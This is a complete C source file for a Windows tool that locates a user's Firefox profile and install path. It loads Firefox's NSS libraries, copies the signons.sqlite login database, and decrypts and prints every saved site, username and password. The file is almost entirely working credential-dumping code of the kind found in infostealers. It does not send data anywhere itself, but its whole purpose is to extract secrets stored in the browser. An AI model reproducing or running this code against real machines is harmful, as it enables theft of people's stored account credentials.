#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdio.h>

#include "sqlite3.h"
#include "utils.h"
#include "firepass.h"

/* Link with the Advapi32.lib file.
 * ( registry query functions, and others.. )
 */
#pragma comment (lib, "advapi32")

// Create a list of libraries (in order of dependency)
char* libList[] = { "mozglue.dll", "nspr4.dll", "plc4.dll", "plds4.dll",
        "nssutil3.dll", "mozsqlite3.dll", "softokn3.dll", "nss3.dll", NULL
};

// Handles for libraries with used functions
HMODULE libnss = NULL;
HMODULE libplc = NULL;

typedef struct PK11SlotInfoStr PK11SlotInfo;

// NSS Library functions
typedef SECStatus      (*NSS_Init) (const char *configdir);
typedef SECStatus      (*NSS_Shutdown) (void);
typedef PK11SlotInfo * (*PK11_GetInternalKeySlot) (void);
typedef void           (*PK11_FreeSlot) (PK11SlotInfo *slot);
typedef SECStatus      (*PK11_CheckUserPassword) (PK11SlotInfo *slot,char *pw);
typedef SECStatus      (*PK11_Authenticate) (PK11SlotInfo *slot, PRBool loadCerts, void *wincx);
typedef SECStatus      (*PK11SDR_Decrypt) (SECItem *data, SECItem *result, void *cx);

// PLC Library functions
typedef char *         (*PL_Base64Decode)( const char *src, PRUint32 srclen, char *dest);

NSS_Init                NSSInit;
NSS_Shutdown            NSSShutdown;
PK11_GetInternalKeySlot PK11GetInternalKeySlot;
PK11_CheckUserPassword  PK11CheckUserPassword;
PK11_FreeSlot           PK11FreeSlot;
PK11_Authenticate       PK11Authenticate;
PK11SDR_Decrypt         PK11SDRDecrypt;
PL_Base64Decode         PLBase64Decode;

char masterPassword[1024] = {0};
int IsNSSInitialized = 0;

static void usage(char* exe );
static int dump_ff(char* ff_prof_path);
static int process_row(void *passed_db, int argc, char **argv, char **col_name);
static char *get_user_profile_path();
static char *GetFirefoxLibPath();
HMODULE LoadLibrary2(char *libDir, char *libName);
static int LoadFirefoxLibraries(char *firefoxPath);
static void TerminateFirefoxLibrary();
static int InitializeNSSLibrary(char *profilePath, char *password);
static int CheckMasterPassword(char *password);
static int Base64Decode(char *encryptedData, char **decodeData, int *decodeLen);
static int DecryptSecretString(char *encryptedData, char **clearData);
static int PK11Decrypt(char *encryptedData, int encryptedLen, char **clearData, int *finalLen);

#define MAX_KEY_LEN         1024

int main(int argc, char **argv){
    char mk[MAX_KEY_LEN] = {0};

    if (argc == 2) {
        if (!strncmp(argv[1], "-h", 2)) {
            usage(argv[0]);
            exit(0);
        } else {
            strncpy(mk, argv[1], MAX_KEY_LEN-1);
            printf("Read master password: %s\n", mk);
        }
    } else if (argc >= 3) {
        printf("Invalid number of parameters\n");
        usage(argv[0]);
        exit(1);
    }

    char* ff_prof_path = NULL;
    ff_prof_path = get_user_profile_path();

    char *ff_lib_path = NULL;
    ff_lib_path = GetFirefoxLibPath();

    LoadFirefoxLibraries(ff_lib_path);

    if( InitializeNSSLibrary(ff_prof_path, mk) )  {
        dump_ff(ff_prof_path);
        TerminateFirefoxLibrary();
    }

    free(ff_lib_path);
    free(ff_prof_path);

    return 0;
}

static void usage(char* exe ) {
    printf( "Dump (and decrypt) saved FireFox passwords\n" );
    printf( "(tested with FF 10)\n" );
    printf( "Usage: %s passwd\n" \
            "passwd\tOptional master password\n", exe);
}

static int dump_ff(char* ff_prof_path) {
    int rc = 0;
    sqlite3 *db = NULL;
    char *err_msg = NULL;

    /* Get FF passwords database */
    char login_db[200] = {0};
    strcat(login_db, ff_prof_path);
    strcat(login_db, "\\signons.sqlite");
    printf("key3.db and signons.sqlite path: [%s]\n", login_db);

    /* Use a copy of the db. (original may be already locked) */
    rc = CopyFile(login_db, "copy_ff_db",FALSE);
    if(!rc){
        fprintf(stderr, "CopyFile failed\n");
        exit(1);
    }

    rc = sqlite3_open("copy_ff_db", &db);
    if(rc){
        fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);
        return(1);
    }

    rc = sqlite3_exec(db, "SELECT * FROM moz_logins", process_row, db, &err_msg);
    if( rc != SQLITE_OK ){
        fprintf(stderr, "SQL error: %s (%d)\n", err_msg, rc);
        sqlite3_free(err_msg);
    }

    sqlite3_free(err_msg);
    sqlite3_close(db);

    rc = DeleteFile("copy_ff_db");
    if( !rc ){
        fprintf(stderr, "DeleteFile failed\n");
    }

    return rc;

}

/* 4th argument of sqlite3_exec is the 1st argument to callback */
static int process_row(void *passed_db, int argc, char **argv, char **col_name){
    int i = 0;
    char *clearData = NULL;
    passed_db = passed_db;

    for(i=0; i<argc; i++){
        if ( !strcmp(col_name[i], "id")) {
            printf("Id: %s\n", argv[i]);
        } else if ( !strcmp(col_name[i], "hostname")) {
            printf("Url: %s\n", argv[i]);
        } else if ( !strcmp(col_name[i], "formSubmitURL")) {
            printf("Form URL: %s\n", argv[i]);
        } else if ( !strncmp(col_name[i], "encrypted", 9)) {
            printf("%s: %s\n", col_name[i], argv[i]);
            DecryptSecretString(argv[i], &clearData);
            printf("(Decrypted) : %s\n", clearData);
            free(clearData);
            clearData = NULL;
        }
    }

    printf("\n");
    return 0;
}

static int DecryptSecretString(char *encodedData, char **clearData) {
    char *decodedData = NULL;
    int decodedLen = 0;
    char *finalData = NULL;
    int finalLen = 0;

    // First do base64 decoding
    if( Base64Decode(encodedData, &decodedData, &decodedLen) || !decodedData ) {
        printf("Base64 decoding of data failed\n");
        return 1;
    }

    // Now do actual PK11 decryption
    if( PK11Decrypt(decodedData, decodedLen, &finalData, &finalLen) || !finalData ) {
        printf("Failed to decrypt the string\n");
        return 1;
    }

    // Decrypted string is not NULL terminated
    *clearData = (char*) malloc( finalLen + 1 );
    memcpy(*clearData, finalData, finalLen);
    *(*clearData + finalLen) = 0;

    return 0;
}

static int Base64Decode(char *encodedData, char **decodedData, int *decodedLen) {
    int len = strlen( encodedData );
    int adjust = 0;

    // Compute length adjustment
    if (encodedData[len-1] == '=') {
        adjust++;
        if (encodedData[len-2] == '=')
            adjust++;
    }

    *decodedData = ( char *)(*PLBase64Decode)(encodedData, len, NULL);

    if( *decodedData == NULL ) {
        printf("Base64 decoding failed\n");
        return 1;
    }

    *decodedLen = (len*3)/4 - adjust;

    printf("Length of decoded data: %d\n", *decodedLen);

    return 0;
}

static int PK11Decrypt(char *encryptedData, int encryptedLen, char **clearData, int *finalLen) {
    PK11SlotInfo *slot = 0;
    SECStatus status;
    SECItem request;
    SECItem reply;

    // Find token with SDR key
    slot = (*PK11GetInternalKeySlot)();

    if (!slot) {
        printf("PK11_GetInternalKeySlot failed\n");
        return 1;
    }

    if ( (*PK11Authenticate)(slot, PR_TRUE, NULL) != SECSuccess) {
        printf("PK11_Authenticate failed\n");
        return 1;
    }

    // Decrypt the string
    request.data = (unsigned char *)encryptedData;
    request.len = encryptedLen;

    reply.data = 0;
    reply.len = 0;

    status = (*PK11SDRDecrypt)(&request, &reply, NULL);

    if (status != SECSuccess) {
        printf("PK11SDR_Decrypt failed (status code: %d)\n", status);
        return 1;
    }

    *clearData = (char*)reply.data;
    *finalLen  = reply.len;

    // Free the slot
    (*PK11FreeSlot)(slot);

    return 0;
}

static char *get_user_profile_path(){
    int rc = 0;
    char line[1024] = {0};

    /* Get FF passwords database */
    char user_profile[100];
    rc = GetEnvironmentVariable("UserProfile", user_profile, 100);
    if(0 != rc){
        printf("UserProfile folder: [%s]\n", user_profile);
    }

    char partial_prof_dir[200] = {0};
    strcat(partial_prof_dir, user_profile);
    strcat(partial_prof_dir, "\\Application Data\\Mozilla\\Firefox\\");

    char profile_file[250] = {0};
    strcat(profile_file, partial_prof_dir);
    strcat(profile_file, "\\profiles.ini");

    // Open the firefox profile setting file
    FILE *profile = fopen(profile_file, "r");

    if( profile == NULL )
    {
        printf("Unable to find firefox profile file: %s\n", profile_file);
        return NULL;
    }

    // Check each line of profile settings file for line "name=default" string
    // This indicates that we are looking under default profile...
    // So one among next few lines will have path information..just copy that...
    char prof_dir[500] = {0};
    strcat(prof_dir, partial_prof_dir);

    int isDefaultFound = 0;
    while(fgets(line, 1024, profile))
    {
        if( !isDefaultFound && ( strstr(line, "Name=default") != NULL) ) {
            isDefaultFound = 1;
            continue;
        }

        // We have got default profile ..now check for path
        if( isDefaultFound ) {
            if( strstr(line,"Path=") != NULL)  {
                char *subdir = (strchr(line, '=') + 1);
                strcat(prof_dir, subdir);
                prof_dir[strlen(prof_dir)-1] = '\0';  // supress line termiantor '\n'
                printf("Firefox Profile dir: [%s]\n", prof_dir);
                break;
            }
        }

    }
    fclose(profile);

    char *ret_prof_dir = (char*)malloc(sizeof(prof_dir));
    strcpy(ret_prof_dir, prof_dir);

    return ret_prof_dir;
}

static char *GetFirefoxLibPath()
{
    char regSubKey[]    = "SOFTWARE\\Clients\\StartMenuInternet\\firefox.exe\\shell\\open\\command";
    char path[_MAX_PATH] ="";
    char *firefoxPath = NULL;
    DWORD pathSize = _MAX_PATH;
    DWORD valueType;
    HKEY rkey;

    // Open firefox registry key
    if( RegOpenKeyEx(HKEY_LOCAL_MACHINE, regSubKey, 0, KEY_READ, &rkey) != ERROR_SUCCESS )
    {
        printf("Failed to open the firefox registry key : HKLM\\%s", regSubKey );
        return NULL;
    }

    // Read the firefox path value
    if( RegQueryValueEx(rkey, NULL, 0,  &valueType, (unsigned char*)&path, &pathSize) != ERROR_SUCCESS )
    {
        printf("Failed to read the firefox path value from registry\n");
        RegCloseKey(rkey);
        return NULL;
    }

    RegCloseKey(rkey);

    printf("Firefox.exe path: [%s] (len: %d)\n", path, pathSize);

    char * tmp = strrchr(path, '\\');   // Trim executable name
    *tmp = NULL;
    firefoxPath = (char*) malloc( strlen(path) + 1);
    strcpy(firefoxPath, path);

    printf("Firefox path = [%s]\n", firefoxPath);

    return firefoxPath;
}

static int LoadFirefoxLibraries(char *firefoxPath) {
    int i = 0;
    char* libName = NULL;

    // Load the libraries from firefox path.
    if ( NULL == firefoxPath) {
        return 1;
    }

    for (i = 0, libName = libList[0]; libName != NULL; ++i, libName = libList[i]) {
        if(NULL == LoadLibrary2(firefoxPath, libName)){
            return 1;
        }
    }

    printf("Firefox libraries loaded successfully\n");

    // Load required functions
    NSSInit = (NSS_Init) GetProcAddress(libnss, "NSS_Init");
    NSSShutdown = (NSS_Shutdown)GetProcAddress(libnss, "NSS_Shutdown");
    PK11GetInternalKeySlot = (PK11_GetInternalKeySlot) GetProcAddress(libnss, "PK11_GetInternalKeySlot");
    PK11FreeSlot = (PK11_FreeSlot) GetProcAddress(libnss, "PK11_FreeSlot");
    PK11Authenticate = (PK11_Authenticate) GetProcAddress(libnss, "PK11_Authenticate");
    PK11SDRDecrypt = (PK11SDR_Decrypt) GetProcAddress(libnss, "PK11SDR_Decrypt");
    PK11CheckUserPassword = (PK11_CheckUserPassword ) GetProcAddress(libnss, "PK11_CheckUserPassword");
    PLBase64Decode     = ( PL_Base64Decode ) GetProcAddress(libplc, "PL_Base64Decode");

    if( !NSSInit || !NSSShutdown || !PK11GetInternalKeySlot || !PK11Authenticate ||
            !PK11SDRDecrypt || !PK11FreeSlot || !PK11CheckUserPassword || !PLBase64Decode )  {
        TerminateFirefoxLibrary();
        return 1;
    }

    printf("Firefox functions loaded successfully\n");

    return 1;

}

HMODULE LoadLibrary2(char *libDir, char *libName){
    char loadPath[4096] = {0};
    HMODULE tmpLib = NULL;

    strcpy(loadPath, libDir);
    strcat(loadPath, "/");
    strcat(loadPath, libName);

    if(!strcmp(libName, "nss3.dll")) {
        libnss = LoadLibrary(loadPath);
        tmpLib = libnss;
    } else if (!strcmp(libName, "plc4.dll")) {
        libplc = LoadLibrary(loadPath);
        tmpLib = libplc;
    } else {
        tmpLib = LoadLibrary(loadPath);
    }

    if( NULL == tmpLib ) {
        printf("Failed to load library %s\n", libName);
        return NULL;
    }

    printf("%s loaded successfuly\n", libName);

    return tmpLib;
}

static void TerminateFirefoxLibrary() {
    if( IsNSSInitialized  && (NSSShutdown != NULL) )
        (*NSSShutdown)();

    if( libnss != NULL )
        FreeLibrary(libnss);

    if( libplc != NULL )
        FreeLibrary(libplc);
}

static int InitializeNSSLibrary(char *profilePath, char *password){
    IsNSSInitialized = 0;

    if( (*NSSInit) (profilePath) != SECSuccess ) {
        printf("Initialization failed , Make sure key3.db and cert8.db "\
                "files are present in the specified directory\n");
        TerminateFirefoxLibrary();
        return 0;
    }

    IsNSSInitialized = 1;

    // Check if master password is correct
    if( password != NULL){
        strcpy(masterPassword, password);
    }

    if( CheckMasterPassword( masterPassword ) != 1) {
        TerminateFirefoxLibrary();
        return 0;
    }

    printf("NSS library initiliazed successfully\n");

    return 1;
}

static int CheckMasterPassword(char *password) {
    PK11SlotInfo *slot = NULL;
    int ret = 0;

    slot = (*PK11GetInternalKeySlot)();

    if (NULL == slot) {
        printf("PK11_GetInternalKeySlot failed\n");
        return 0;
    }

    // First check if the master password set
    if( (*PK11CheckUserPassword)(slot, "") == SECSuccess )
    {
        printf("Master Password is NOT set\n");
        (*PK11FreeSlot) (slot);
        return 1;
    }

    // Check password
    if( (*PK11CheckUserPassword)(slot, password) == SECSuccess ) {
        printf("Master password is correct\n");
        ret = 1;
    } else {
        printf("Specified master password %s is wrong", password);
        ret = 0;
    }

    (*PK11FreeSlot) (slot);

    return ret;
}